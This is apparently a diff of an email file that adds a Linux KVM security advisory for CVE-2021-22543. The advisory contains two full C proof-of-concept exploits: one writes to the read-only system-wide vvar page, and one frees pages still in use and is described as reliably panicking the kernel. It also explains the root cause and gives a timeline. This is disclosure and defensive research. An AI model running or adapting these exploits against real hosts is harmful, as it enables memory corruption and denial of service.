-vrnSGUFfW31PGJ/SVV3nJtWoygToacNzwUUwT3Y8VWFcfypC9hI856BDlvOlb7X0=0A=
-JBagdmgJqCWMAkKPPQNsS5xRcHTxnd8b63UrC4Vi4M423ThAByjERzYoGPmb/mJF=0A=
-tcZrGwTArUfwNKFEvDLt7gcZNIvuPWeTVWHgr4Suko3EkRTIL2w6TppylLJTi1jI=0A=
-yNMtzsFNBGm7HhsBEACw4nqhta7zFWEt/UpPEYkenWpbT2nVDtuKn1uELMCV+Sy8=0A=
-Jdcec9VKQm6q4y9xqkLuMT5y1x213dpPJVHegks8TJaFf3yaA+++QtqHP2biEaqk=0A=
-6HSpa5DIoGt95Uc58FVKiNQZ3w8bbna3Vrzy920WcBydKY6U2wemJf9hSdM4l15l=0A=
-ezk3HOnJaxKt+hTuaISUlEhZDQ3UtwdlKAWjcYkzkObVhZugZS8tWCpWsRq4eHcy=0A=
-hpxihTZFyKhGkKSu2W2Q+AgFr7TRvdW2/oIjaPSy7DeqH88STz3Nvzg9ztnqzQ5j=0A=
-DKWamnlrjbxllI77c9+fvp2lkt/9hQtQ0SP6amEoYxfckJ0Q2AVTb4ixk8/Xv77g=0A=
-fIDJQ4HoTyPF2CXVpV2V8RPFKhwwZcdcna7eyw+zTXrl6Grjj6P0olrBCzvwvFex=0A=
-3c2rqhWzZKZnIqH4QHDV4GPGO1BPsnHRe0j+ZhZ03EVS+IxOlaExiF/wIm7S7VgH=0A=
-ZjTBs3V9L+szy2gO73ms+yh7n1PrXw+nI38f3xqGyZCfCX5kNwAoB0+izqOD9Cy/=0A=
-syviXgwbtbmu35NIbmOk9yMPvHVO6o6JQlq9moNaXEn7N4abFWHKP4lvLe6Yn3av=0A=
-y8+byR8bZplYQbBTrEtjGanO9nNannlyFnEDvUoQQ3PozyyztzerC5z6uPSSIQAR=0A=
-AQABwsGYBBgBCABCFiEEwo5Vl+U+phfaPpN5Bjja07gsOYgFAmm7HhsbFIAAAAAA=0A=
-BAAObWFudTIsMi41KzEuMTIsMCwzAhsMBQkDwmcAAAoJEAY42tO4LDmIXqkP+gPE=0A=
-jSFIH4HYoEsBE2wBiJlS5bBMsmElFCYyRM1S4az/RS3FX8r2a+J58UuUeANs4wiZ=0A=
-/4iGlBvdYn7rwB1Yb2/LIO5Pcsc9UvWKv2fEbpIbc7GMvb8+egFfkn7pHSbOqHxV=0A=
-7Z+JRoXToxcIqmlZi43mz7hVdR0ei8WMBR5nKVE6Ixt47QHilQ5kLMCqVmNojFz/=0A=
-H6t5uhjs3X6oalsB5/AoeL0jH62Dd1NWq1vBaqKYBLHyNNATkl97VdAUgaFE28Q4=0A=
-Nx+as9AGY5sr6yBoHD+QjZwnNydR6uRCY7qD+mqQv9KbHhBLd7HqyjXY7tG7pPnP=0A=
-4XeNkiUUDwIv2sYUSEhN89R5kk1YDKQ14N2/43l7JGCvnll64iomqqmejykliW+T=0A=
-6HhpKYNTH9ldYpjGmcYo4y093DnEA8nCXwpa3HO17ZQ7nxlg00Y3Oo4WpSGwAlpI=0A=
-81y4shJtQGwrnHaqqfH4/obXwb3SOLsFCPF9fZxtXmlO1VOA5JaM8y6DIqBewPNA=0A=
-WNzZu3qeBJd716WXp1ivUjvFRLcCMU6GxOMTv7dz1GP3d/xG9/Lb/mBK78Lu6fPc=0A=
-nV7MQp38mYdfj9T1t0pu/GTDpG0AYRl124U8onEwl3KJzst8AO8G0kKyWdXR0cRe=0A=
-+qGYa3LmV2soXmdh0GFZ5KFjVYvdtAgTRIrQIz/K=0A=
-=3Drf4K=0A=
------END PGP PUBLIC KEY BLOCK-----=0A=
+--0OAP2g/MAC+5xKAE
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="GHSA-7wq5-phmq-m584.txt"
 
---------------YOcaV5SdIsbPgtz60RrUDJOU--
+                   Linux: KVM VM_IO|VM_PFNMAP vma mishandling
 
---------------6DpBeX31smAQ8S7I4TOXPCVx--
+   moderate
+   sirdarckcat published GHSA-7wq5-phmq-m584 May 18, 2021
 
---------------R0TBf6cHoSqm0g5jwkT0kirP
-Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="OpenPGP_signature.asc"
+Package
 
------BEGIN PGP SIGNATURE-----
+   Linux Kernel
 
-wsF5BAABCAAjFiEEwo5Vl+U+phfaPpN5Bjja07gsOYgFAmnynoEFAwAAAAAACgkQBjja07gsOYiN
-5xAAiyASywFgefOVQ89qSUvCkbH+MAbKoiUPtpeXaWazq7qHEVSN7WlhsA08qaeQdKvPiwr9SlL6
-NIKCVB0wtOfkjSDgW4r5CKm9d3sGt+ovf5Z/o1D2b3XGI1XysEFjbIQIK+814VgbzHbWmAWUrSZ+
-lX7RQOrv2RSWmDBYqx3yM6T4iH5U82aibGJPxj9VbyY6kapzDawI8gRkvFx5MnEZgjeuzBDloZra
-5LNtBq2tpkJYAIwZCxOOhSi5g/bSwgfKQVBUz22oRojpDWoWB6Spc5yOTiWsYXGqWoFPabC+/16C
-me8wy9Iy8FaqZQRN0h+uICc8XuX62fdcm5ol+IBj240dmAq2kmZxPz2xzBX/lOFZO4bpSrm35H00
-X0pdbWddTonl9YMOSiS6kt/cdsgdzQUeG7xq2zehpohv0vbeFWgmVhWo2hE0H0OYbOi1HFdr8aXa
-2au+pu1ipvCsCxWIjE+q4jONcOgEYjYGl/+OuP4Iwc9/m8vKfxOkqNe7Pw8aP0GgFVDhAPuoBEwv
-kSMJExfq/n4TrloH7bV8LKSSjGC8trnHWK0KARsIFANo0XEkZjHXcVGkPY/Z4YIPsl3c6+5ve1a3
-5q9MHDpQJPFV4+GagETTaILu6TSRwl09SWR53HKLN+cZ7bVX8Gj1Zi6qT7AQ4d8JjXXonFgp5yP3
-2UE=
-=Zc5f
------END PGP SIGNATURE-----
+Affected versions
 
---------------R0TBf6cHoSqm0g5jwkT0kirP--
+   add6a0cd1c5ba51b201e1361b05a5df817083618
+
+Patched versions
+
+   n/a
+
+Description
+
+  Summary
+
+   Improper handling of VM_IO|VM_PFNMAP vmas in KVM can bypass RO checks and
+   can lead to pages being freed while still accessible by the VMM and guest.
+
+  Severity
+
+   Moderate - On some systems, allows users with the ability to start and
+   control a VM to read/write random pages of memory.
+
+  Proof of Concept
+
+   vvar_write.c
+   Compile the code below using gcc -o vvar_write vvar_write.c. Running the
+   code once will show that the vvar page is modified, and running it a
+   second time will show the modification affects other processes.
+
+ /* @author Jann Horn
+  * at https://elixir.bootlin.com/linux/v5.10.11/source/arch/x86/entry/vdso/vma.c#L297 we map the
+  * VVAR page of the VDSO, which contains a struct vdso_data
+  * (https://elixir.bootlin.com/linux/v5.10.11/source/include/vdso/datapage.h#L90) that contains
+  * information about clock offsets and such (to allow ring 3 to figure out the current time using
+  * RDTSC without switching to kernel mode). this page is shared across the entire system so that if
+  * the clock offset changes, it only has to be changed in one central location. the VVAR page is
+  * marked VM_IO so that the get_user_pages machinery keeps its paws off that page. but KVM's
+  * hva_to_pfn() is AFAICS going to first try get_user_pages, that will fail, then it notices that
+  * the VMA is VM_IO, goes down the hva_to_pfn_remapped path, and then I think that thing just grabs
+  * the PFN with follow_pfn and forces the writable flag to true even though the PFN is read-only...
+ */
+ #define _GNU_SOURCE
+ #include <stdio.h>
+ #include <string.h>
+ #include <err.h>
+ #include <errno.h>
+ #include <fcntl.h>
+ #include <stdlib.h>
+ #include <unistd.h>
+ #include <sys/ioctl.h>
+ #include <sys/mman.h>
+ #include <linux/kvm.h>
+
+ /* for real mode */
+ static __attribute__((aligned(4096))) char guest_code[0x1000] = {
+   0x89, 0x35, /* mov [di],si */
+   0xcc, /* int3 */
+ };
+
+ static void create_region(int vm, int slot, unsigned long guest_phys, unsigned long host_addr, unsigned long size) {
+   struct kvm_userspace_memory_region region = {
+     .slot = slot,
+     .guest_phys_addr = guest_phys,
+     .memory_size = size,
+     .userspace_addr = host_addr
+   };
+   if (ioctl(vm, KVM_SET_USER_MEMORY_REGION, &region))
+     err(1, "set region %d", slot);
+ }
+
+ int main(void) {
+   FILE *mapsfile = fopen("/proc/self/maps", "r");
+   if (mapsfile == NULL)
+     err(1, "open maps");
+   unsigned long vvar_addr;
+   while (1) {
+     char buf[4096];
+     errno = 0;
+     if (fgets(buf, sizeof(buf), mapsfile) == NULL)
+       err(1, "fgets maps EOF or error");
+     if (strstr(buf, "[vvar]") == NULL)
+       continue;
+     vvar_addr = strtoul(buf, NULL, 16);
+     break;
+   }
+   printf("vvar is at 0x%lx\n", vvar_addr);
+   printf("testing read of first vvar page at offset 0xf00: 0x%lx\n", *(unsigned long *)(vvar_addr + 0xf00));
+
+   int kvm = open("/dev/kvm", O_RDWR);
+   if (kvm == -1)
+     err(1, "open kvm");
+   int mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, 0);
+   if (mmap_size == -1)
+     err(1, "KVM_GET_VCPU_MMAP_SIZE");
+
+   int vm = ioctl(kvm, KVM_CREATE_VM, 0);
+   if (vm == -1)
+     err(1, "create vm");
+   if (ioctl(vm, KVM_SET_TSS_ADDR, 0x10000000UL))
+     err(1, "KVM_SET_TSS_ADDR");
+   create_region(vm, 0, 0x0, (unsigned long)guest_code, 0x1000);
+   create_region(vm, 1, 0x1000, vvar_addr, 0x1000);
+
+   int vcpu = ioctl(vm, KVM_CREATE_VCPU, 0);
+   if (vcpu == -1)
+     err(1, "create vcpu");
+   struct kvm_run *vcpu_state = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpu, 0);
+   if (vcpu_state == MAP_FAILED)
+     err(1, "mmap vcpu");
+
+   struct kvm_sregs sregs;
+   if (ioctl(vcpu, KVM_GET_SREGS, &sregs))
+     err(1, "KVM_GET_SREGS");
+   sregs.cs.selector = 0;
+   sregs.cs.base = 0;
+   struct kvm_regs regs = {
+     .rdi = 0x1f00,
+     .rsi = 0xf00d,
+     .rip = 0x0,
+     .rflags = 2
+   };
+   if (ioctl(vcpu, KVM_SET_SREGS, &sregs))
+     err(1, "set sregs");
+   if (ioctl(vcpu, KVM_SET_REGS, &regs))
+     err(1, "set regs");
+
+   if (ioctl(vcpu, KVM_RUN, 0))
+     err(1, "run vcpu");
+   printf("exit_reason = %d\n", vcpu_state->exit_reason);
+   if (vcpu_state->exit_reason == KVM_EXIT_FAIL_ENTRY) {
+     printf("KVM_EXIT_FAIL_ENTRY happened: hardware_entry_failure_reason = 0x%lx\n",
+            (unsigned long)vcpu_state->fail_entry.hardware_entry_failure_reason);
+   }
+
+   printf("testing read of first vvar page at offset 0xf00: 0x%lx\n", *(unsigned long *)(vvar_addr + 0xf00));
+ }
+
+   kernel_write.c
+   Compile the code below using gcc -o kernel_write kernel_write.c. What
+   exactly happens when running the code depends on what the improperly freed
+   page is reallocated for. Running 100 instances in parallel should reliably
+   cause a kernel panic within a few seconds.
+
+ /* @author Jann Horn */
+ #define _GNU_SOURCE
+ #include <stdio.h>
+ #include <string.h>
+ #include <err.h>
+ #include <errno.h>
+ #include <fcntl.h>
+ #include <stdlib.h>
+ #include <unistd.h>
+ #include <sys/ioctl.h>
+ #include <sys/mman.h>
+ #include <linux/kvm.h>
+
+ /* for real mode */
+ static __attribute__((aligned(4096))) char guest_code[0x1000] = {
+   0x89, 0x35, /* mov [di],si */
+   0xcc, /* int3 */
+ };
+
+ static void create_region(int vm, int slot, unsigned long guest_phys, unsigned long host_addr, unsigned long size) {
+   struct kvm_userspace_memory_region region = {
+     .slot = slot,
+     .guest_phys_addr = guest_phys,
+     .memory_size = size,
+     .userspace_addr = host_addr
+   };
+   if (ioctl(vm, KVM_SET_USER_MEMORY_REGION, &region))
+     err(1, "set region %d size=0x%lx", slot, size);
+ }
+
+ int main(void) {
+   sync(); /* in case we're about to panic the kernel... */
+
+   char *usb_path = "/dev/bus/usb/001/001";
+   int usb_fd = open(usb_path, O_RDONLY);
+   if (usb_fd == -1)
+     err(1, "open '%s'", usb_path);
+   char *usb_mapping = mmap(NULL, 0x2000, PROT_READ, MAP_SHARED, usb_fd, 0);
+   if (usb_mapping == MAP_FAILED)
+     err(1, "mmap 2 pages from usb device");
+
+   int kvm = open("/dev/kvm", O_RDWR);
+   if (kvm == -1)
+     err(1, "open kvm");
+   int mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, 0);
+   if (mmap_size == -1)
+     err(1, "KVM_GET_VCPU_MMAP_SIZE");
+
+   int vm = ioctl(kvm, KVM_CREATE_VM, 0);
+   if (vm == -1)
+     err(1, "create vm");
+   if (ioctl(vm, KVM_SET_TSS_ADDR, 0x10000000UL))
+     err(1, "KVM_SET_TSS_ADDR");
+   create_region(vm, 0, 0x0, (unsigned long)guest_code, 0x1000);
+
+   int vcpu = ioctl(vm, KVM_CREATE_VCPU, 0);
+   if (vcpu == -1)
+     err(1, "create vcpu");
+   struct kvm_run *vcpu_state = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, vcpu, 0);
+   if (vcpu_state == MAP_FAILED)
+     err(1, "mmap vcpu");
+
+   while (1) {
+     create_region(vm, 1, 0x1000, (unsigned long)usb_mapping+0x1000, 0x1000);
+     struct kvm_sregs sregs;
+     if (ioctl(vcpu, KVM_GET_SREGS, &sregs))
+       err(1, "KVM_GET_SREGS");
+     sregs.cs.selector = 0;
+     sregs.cs.base = 0;
+     struct kvm_regs regs = {
+       .rdi = 0x1f00,
+       .rsi = 0xf00d,
+       .rip = 0x0,
+       .rflags = 2
+     };
+     if (ioctl(vcpu, KVM_SET_SREGS, &sregs))
+       err(1, "set sregs");
+     if (ioctl(vcpu, KVM_SET_REGS, &regs))
+       err(1, "set regs");
+
+     if (ioctl(vcpu, KVM_RUN, 0))
+       err(1, "run vcpu");
+     printf("exit_reason = %d\n", vcpu_state->exit_reason);
+     if (vcpu_state->exit_reason == KVM_EXIT_FAIL_ENTRY) {
+       printf("KVM_EXIT_FAIL_ENTRY happened: hardware_entry_failure_reason = 0x%lx\n",
+              (unsigned long)vcpu_state->fail_entry.hardware_entry_failure_reason);
+     }
+     create_region(vm, 1, 0, 0, 0);
+   }
+ }
+
+  Further Analysis
+
+   The issue is in how KVM handles mapping certain types of host memory into
+   the guest. Most of the time, KVM uses get_user_pages to translate the host
+   virtual address to the page it needs to map into the guest. However,
+   get_user_pages will fail if the address lies in a vma with the VM_IO or
+   VM_PFNMAP flag set (checked in check_vma_flags [1]). KVM handles that
+   failure by using follow_pfn to fetch the page directly from the vma [2].
+   If those pages do not have the PG_reserved bit set, KVM proceeds to treat
+   them as normal pages [3], and will call getpage/putpage on them. However,
+   reference counting on the pages might not be set up to handle this - for
+   example, tail pages of the higher order pages allocated in
+   ttm_pool_alloc_page [4]. Such pages can end up being freed by the call to
+   putpage at the end of the guest page fault, even though the guest and host
+   still reference the page.
+
+   [1]
+   https://github.com/torvalds/linux/blob/d635a69dd4981cc51f90293f5f64268620ed1565/mm/gup.c#L886
+   [2]
+   https://github.com/torvalds/linux/blob/d635a69dd4981cc51f90293f5f64268620ed1565/virt/kvm/kvm_main.c#L1981
+   [3]
+   https://github.com/torvalds/linux/blob/d635a69dd4981cc51f90293f5f64268620ed1565/virt/kvm/kvm_main.c#L174
+   [4]
+   https://github.com/torvalds/linux/blob/f78d76e72a4671ea52d12752d92077788b4f5d50/drivers/gpu/drm/ttm/ttm_pool.c#L83
+
+  Timeline
+
+   Date reported: 2021-02-01 to kernel.org
+   Date fixed: RO bypass fixed on 2021-02-04. Improper freeing of pages not
+   yet fixed.
+   Date disclosed: 2021-05-18
+
+CVE ID
+
+   CVE-2021-22543
+
+    Credits
+
+     * @dgstevens dgstevens
+     * @thejh thejh Jann
+     * @fluxchief fluxchief Kevin Hamacher
+
+--0OAP2g/MAC+5xKAE--
